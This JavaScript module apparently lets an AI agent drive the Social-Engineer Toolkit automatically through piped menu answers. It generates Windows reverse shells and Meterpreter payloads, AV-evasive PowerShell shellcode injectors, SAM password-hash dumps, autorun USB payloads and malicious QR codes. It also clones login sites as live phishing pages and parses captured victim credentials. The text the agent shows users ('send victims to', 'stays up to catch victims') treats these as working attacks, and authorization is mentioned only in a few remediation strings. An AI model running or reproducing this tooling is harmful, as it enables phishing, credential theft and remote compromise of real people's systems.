// SET — the Social-Engineer Toolkit (setoolkit). SET is a big INTERACTIVE menu-driven framework; we drive it
// NON-INTERACTIVELY by piping the exact menu-answer sequence via stdin, with TERM=xterm and a KILL timeout,
// then collecting the artifact it generated (SET frequently hangs on the menu after generating — the timeout
// handles that; the FILE/listener is what matters). Confirmed live: launch → y (EULA) → 1 (Social-Engineering
// Attacks) → <vector> → …  A QR code and payloads were generated end-to-end this way.
//
// Social-Engineering Attacks submenu (main-menu option 1), SET 8.1.3:
//   1 Spear-Phishing · 2 Website Attack · 3 Infectious Media · 4 Create Payload+Listener · 5 Mass Mailer
//   6 Arduino · 7 Wireless AP · 8 QRCode · 9 Powershell · 10 Third-Party
//
// Vectors that start a SERVER (credential harvester / tabnabbing / web-jacking, or a payload listener) are
// marked listener:true — the agent runs those as a PERSISTENT background job so the phishing site / handler
// stays alive to catch victims (reuses the job manager).

// ---- payload types under "Create a Payload and Listener" (menu 4) ----
export const SET_PAYLOADS = {
  1: 'Windows Shell Reverse_TCP',
  2: 'Windows Reverse_TCP Meterpreter',
  3: 'Windows Reverse_TCP VNC DLL',
  4: 'Windows Shell Reverse_TCP X64',
  5: 'Windows Meterpreter Reverse_TCP X64',
  6: 'Windows Meterpreter Egress Buster',
  7: 'Windows Meterpreter Reverse HTTPS',
  8: 'Windows Meterpreter Reverse DNS',
  9: 'Download/Run your Own Executable',
};
// map a keyword to the payload number
function payloadNum(q = '') {
  const s = String(q).toLowerCase();
  if (/https/.test(s)) return 7;
  if (/dns/.test(s)) return 8;
  if (/vnc/.test(s)) return 3;
  if (/x64|64/.test(s) && /shell/.test(s)) return 4;
  if (/x64|64/.test(s)) return 5;
  if (/shell/.test(s)) return 1;
  return 2; // default: meterpreter reverse_tcp
}

// ---- powershell attack vectors (menu 9) ----
export const SET_POWERSHELL = {
  1: 'Powershell Alphanumeric Shellcode Injector',
  2: 'Powershell Reverse Shell',
  3: 'Powershell Bind Shell',
  4: 'Powershell Dump SAM Database',
};

// ---- the numbered top-level attack catalog (what the user picks) ----
export const SET_MENU = [
  { id: 1, name: 'QRCode Generator (malicious QR to a URL)', vector: 'qrcode', needs: ['url'] },
  { id: 2, name: 'Create a Payload + Listener (Windows exe/meterpreter)', vector: 'payload', needs: ['lhost', 'lport'], listener: true },
  { id: 3, name: 'Credential Harvester — clone a login site & capture creds', vector: 'harvester', needs: ['lhost', 'url'], listener: true },
  { id: 4, name: 'Web-Jacking Attack (fake "site moved" link)', vector: 'webjacking', needs: ['lhost', 'url'], listener: true },
  { id: 5, name: 'Tabnabbing Attack', vector: 'tabnabbing', needs: ['lhost', 'url'], listener: true },
  { id: 6, name: 'Powershell Reverse Shell', vector: 'powershell-reverse', needs: ['lhost', 'lport'] },
  { id: 7, name: 'Powershell Bind Shell', vector: 'powershell-bind', needs: ['lport'] },
  { id: 8, name: 'Powershell Alphanumeric Shellcode Injector', vector: 'powershell-alpha', needs: ['lhost', 'lport'] },
  { id: 9, name: 'Powershell Dump SAM Database', vector: 'powershell-sam', needs: [] },
  { id: 10, name: 'Infectious Media Generator (autorun USB payload)', vector: 'infectious', needs: ['lhost', 'lport'] },
  { id: 11, name: 'Mass Mailer / Spear-Phishing (email attack)', vector: 'massmailer', needs: [] },
  { id: 12, name: 'Wireless Access Point Attack Vector', vector: 'wifi', needs: [] },
];

export function renderSetMenu() {
  const lines = ['**Social-Engineer Toolkit (SET) — pick an attack by number (or describe it):**'];
  for (const m of SET_MENU) lines.push(`${String(m.id).padStart(2)}. ${m.name}`);
  lines.push('\nTell me the details it needs (I can detect your IP for LHOST): a URL to clone/point at, and/or LHOST + LPORT. Cloned-site & payload listeners run as LIVE background jobs so they stay up to catch victims.');
  return lines.join('\n');
}

export function pickSetVector(query) {
  const q = String(query || '').toLowerCase().trim();
  const num = parseInt(q, 10);
  if (num && SET_MENU.find((m) => m.id === num)) return SET_MENU.find((m) => m.id === num);
  const by = (v) => SET_MENU.find((m) => m.vector === v);
  if (/qr\s?code|qr\b/.test(q)) return by('qrcode');
  if (/harvest|credential|clone.*(login|site)|phish.*(page|site)|fake.*login/.test(q)) return by('harvester');
  if (/web.?jack/.test(q)) return by('webjacking');
  if (/tabnab/.test(q)) return by('tabnabbing');
  if (/powershell.*(reverse)/.test(q)) return by('powershell-reverse');
  if (/powershell.*bind/.test(q)) return by('powershell-bind');
  if (/powershell.*(alpha|shellcode|inject)/.test(q)) return by('powershell-alpha');
  if (/powershell.*(sam|dump)|dump.*sam/.test(q)) return by('powershell-sam');
  if (/infectious|autorun|usb/.test(q)) return by('infectious');
  if (/mass.?mail|spear.?phish|email attack/.test(q)) return by('massmailer');
  if (/wireless|wifi|access point|\bap\b/.test(q)) return by('wifi');
  if (/payload|listener|meterpreter|exe|reverse shell|windows shell/.test(q)) return by('payload');
  return null;
}

// escape single quotes for a printf '...' shell literal
const esc = (s) => String(s).replace(/'/g, "'\\''");

// Build the stdin ANSWER SEQUENCE (menu path) for a vector. Returns { seq, listener, timeout, note }.
export function buildSetSequence(vector, { lhost = '', lport = '4444', url = '', payloadType, template = '1' } = {}) {
  const L = lhost, P = String(lport).replace(/[^0-9]/g, '') || '4444', U = url;
  switch (vector) {
    case 'qrcode':
      return { seq: `y\n1\n8\n${U}\n\n99\n99\n`, listener: false, timeout: 60, artifact: 'qrcode_attack.png',
        note: 'Generated a malicious QR code pointing at your URL — /root/.set/reports/qrcode_attack.png. Print/send it; scanning it opens your URL (pair with a cloned login site or a payload).' };
    case 'payload': {
      const pt = payloadType || payloadNum('');
      // y -> 1(SE) -> 4(payload+listener) -> <ptype> -> LHOST -> LPORT -> no (agent starts the handler separately)
      return { seq: `y\n1\n4\n${pt}\n${L}\n${P}\nno\n`, listener: false, timeout: 150, artifact: 'payload',
        note: `Built "${SET_PAYLOADS[pt]}" for LHOST ${L}:${P} (under /root/.set/). Run it on the target; I'll start a matching handler so the session lands. (Prefer \`\`\`msf for the payload+listener flow.)` };
    }
    case 'harvester':
      // y -> 1 -> 2(Website) -> 3(Credential Harvester) -> 2(Site Cloner) -> LHOST(post-back) -> URL. Starts a web server (LIVE).
      return { seq: `y\n1\n2\n3\n2\n${L}\n${U}\n`, listener: true, timeout: 0, artifact: 'harvester',
        note: `Cloned ${U} and is serving the fake login on http://${L}:80 — a LIVE listener. Victim creds are logged to /root/.set/reports/. Send victims to http://${L}. I'll watch for captured credentials.` };
    case 'webjacking':
      return { seq: `y\n1\n2\n5\n2\n${L}\n${U}\n`, listener: true, timeout: 0, artifact: 'harvester',
        note: `Web-Jacking page up on http://${L}:80 (a fake "site has moved" link that redirects to a clone of ${U}). Live listener; creds logged to /root/.set/reports/.` };
    case 'tabnabbing':
      return { seq: `y\n1\n2\n4\n2\n${L}\n${U}\n`, listener: true, timeout: 0, artifact: 'harvester',
        note: `Tabnabbing page up on http://${L}:80 (swaps to a clone of ${U} when the tab loses focus). Live listener; creds logged to /root/.set/reports/.` };
    case 'powershell-reverse':
      return { seq: `y\n1\n9\n2\n${L}\n${P}\nno\n`, listener: false, timeout: 60, artifact: 'powershell',
        note: `Generated a Powershell REVERSE shell (LHOST ${L}:${P}) under /root/.set/reports/powershell/. Run it on the target; start a listener (nc -lvnp ${P} or \`\`\`msf handler).` };
    case 'powershell-bind':
      return { seq: `y\n1\n9\n3\n${P}\nno\n`, listener: false, timeout: 60, artifact: 'powershell',
        note: `Generated a Powershell BIND shell on port ${P} under /root/.set/reports/powershell/. Run on the target, then connect to it on ${P}.` };
    case 'powershell-alpha':
      return { seq: `y\n1\n9\n1\n${L}\n${P}\nno\n`, listener: false, timeout: 90, artifact: 'powershell',
        note: `Generated a Powershell alphanumeric shellcode injector (LHOST ${L}:${P}) under /root/.set/reports/powershell/ — AV-evasive in-memory injection.` };
    case 'powershell-sam':
      return { seq: `y\n1\n9\n4\n\n`, listener: false, timeout: 60, artifact: 'powershell',
        note: 'Generated a Powershell SAM-dump payload under /root/.set/reports/powershell/ — run it on a target to dump local password hashes (crack with ```hashid / john).' };
    case 'infectious':
      return { seq: `y\n1\n3\n2\n${payloadType || 2}\n${L}\n${P}\n`, listener: false, timeout: 150, artifact: 'autorun',
        note: `Built an autorun infectious-media payload (LHOST ${L}:${P}) in /root/.set/autorun/ — copy to a USB; it auto-runs on insertion (where autorun is enabled).` };
    case 'massmailer':
      return { seq: '', listener: false, timeout: 0, artifact: '',
        note: 'Mass Mailer / Spear-Phishing needs an SMTP relay (your own mail server or Gmail app-password) + a recipient list — it can\'t run headless without those. Give me: SMTP creds + target email(s) + the subject/body (and optionally a FileFormat payload to attach), and I\'ll build the campaign.' };
    case 'wifi':
      return { seq: '', listener: false, timeout: 0, artifact: '',
        note: 'The Wireless AP vector needs a monitor-mode Wi-Fi adapter + dnsmasq/hostapd on the exec host (same hardware reality as the ```wireless tool). On a cloud/WSL backend there\'s no radio. On the desktop build with an adapter, this creates a rogue AP that funnels victims to your attacks.' };
    default:
      return { seq: '', listener: false, timeout: 0, artifact: '', note: 'Unknown SET vector.' };
  }
}

// Build the full shell command that drives SET non-interactively and collects the artifact.
export function buildSetCommand(vector, opts = {}) {
  const b = buildSetSequence(vector, opts);
  // Info-only vectors (mass-mailer needs SMTP, wifi needs a radio) run nothing — the agent returns the note.
  if (!b.seq) return { command: null, listener: false, infoOnly: true, note: b.note };
  const ensure = 'command -v setoolkit >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; apt-get install -y set >/dev/null 2>&1; }; ';
  const cfg = 'CFG=$(find / -name "set.config*" 2>/dev/null | head -1); [ -n "$CFG" ] && sed -i "s/^AUTO_UPDATE=.*/AUTO_UPDATE=OFF/" "$CFG" 2>/dev/null; mkdir -p /root/.set && echo y > /root/.set/set.agreement; ';
  const feed = `printf '${esc(b.seq)}' | TERM=xterm`;
  if (b.listener) {
    // credential harvester / tabnabbing / web-jacking: keep SET running (persistent server) — the AGENT runs
    // this as a background job, so NO timeout here.
    return { command: ensure + cfg + `${feed} setoolkit 2>&1`, listener: true, note: b.note, artifact: b.artifact };
  }
  const collect = '; echo "== SET-ARTIFACTS =="; find /root/.set -type f -newermt "-4 minutes" 2>/dev/null | grep -aiE "\\.exe$|\\.png$|payload|powershell|autorun|\\.bat$|\\.txt$|\\.rc$" | while read f; do echo "SET-ARTIFACT: $(ls -la \"$f\" | awk \'{print $5}\') bytes  $f"; done';
  return { command: ensure + cfg + `${feed} timeout -s KILL ${b.timeout} setoolkit >/tmp/set.log 2>&1; tail -25 /tmp/set.log` + collect, listener: false, note: b.note, artifact: b.artifact };
}

// ---- parse SET output -> findings (generated artifacts, cloned sites, captured creds) ----
export function parseSet(command, output) {
  if (!/setoolkit|social-engineer|SET-ARTIFACT/i.test(String(command) + String(output)) || !output) return [];
  const t = String(output);
  const out = [];
  for (const m of t.matchAll(/SET-ARTIFACT:\s*(\d+) bytes\s+(\S+)/gi)) {
    const path = m[2];
    const kind = /\.png$/i.test(path) ? 'malicious QR code' : /powershell/i.test(path) ? 'Powershell payload' : /autorun/i.test(path) ? 'autorun media payload' : /\.exe$/i.test(path) ? 'executable payload' : 'SET payload';
    out.push({ finding_type: 'payload', severity: 'high', source: 'set', title: `SET generated a ${kind}: ${path.split('/').pop()}`, evidence: `${path} (${m[1]} bytes)`, remediation: 'Offensive artifact generated for an authorized engagement — handle/store securely and clean up afterwards.' });
  }
  if (/Credential Harvester is running|harvester.*post back|Cloning the website|The best way to use this attack/i.test(t)) {
    out.push({ finding_type: 'access', severity: 'high', source: 'set', title: 'SET credential-harvester / cloned phishing site is LIVE', evidence: t.slice(0, 200), remediation: 'A live phishing page is capturing credentials — only against authorized targets; take it down after the engagement.' });
  }
  // captured creds (harvester logs "POSSIBLE USERNAME/PASSWORD" or param=value)
  for (const m of t.matchAll(/(?:PARAM|POSSIBLE (?:USERNAME|PASSWORD)[^:]*):\s*(\S+=\S+|\S+)/gi)) {
    out.push({ finding_type: 'credential-access', severity: 'critical', source: 'set', title: `Credential captured via SET phishing: ${m[1].slice(0, 60)}`, evidence: m[0].slice(0, 160), remediation: 'Live credentials captured — rotate them; only for authorized social-engineering assessments.' });
  }
  const seen = new Set();
  return out.filter((f) => (seen.has(f.title) ? false : seen.add(f.title)));
}
